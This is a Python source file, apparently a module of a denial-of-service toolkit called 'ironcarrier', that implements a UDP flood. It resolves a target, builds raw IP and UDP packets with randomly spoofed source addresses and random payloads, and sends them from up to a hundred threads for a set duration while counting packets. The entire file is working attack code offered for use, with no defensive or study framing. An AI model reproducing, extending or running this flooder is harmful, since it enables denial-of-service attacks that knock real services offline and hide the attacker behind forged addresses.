#!/usr/bin/env python3
"""
UDP Flood Vector
High-volume UDP packet flood
"""

import socket
import struct
import random
import time
import threading
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """UDP flood attack vector"""
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.packet_size = min(kwargs.get('size', 1024), 65507)
        self.randomize_payload = kwargs.get('randomize_payload', True)
        self.ttl = kwargs.get('ttl', 64)
        self._resolved_target = None
        self._payload = bytes(random.getrandbits(8) for _ in range(self.packet_size))
    
    def _resolve_target(self) -> str:
        if self._resolved_target:
            return self._resolved_target
        self._resolved_target = socket.gethostbyname(self.target)
        return self._resolved_target
    
    def _build_packet(self) -> bytes:
        dst_ip = self._resolve_target()
        src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        payload = bytes(random.getrandbits(8) for _ in range(self.packet_size)) if self.randomize_payload else self._payload
        
        udp_length = 8 + len(payload)
        udp_header = struct.pack('!HHHH', src_port, self.port, udp_length, 0)
        
        total_length = 20 + udp_length
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, total_length,
            random.randint(0, 65535), 0x4000, self.ttl, 17, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )
        
        return ip_header + udp_header + payload
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        end_time = time.time() + self.duration
        dst = (self._resolve_target(), self.port)
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                packet = self._build_packet()
                sock.sendto(packet, dst)
                self.stats.add_packets(1, len(packet))
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        self._resolve_target()
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
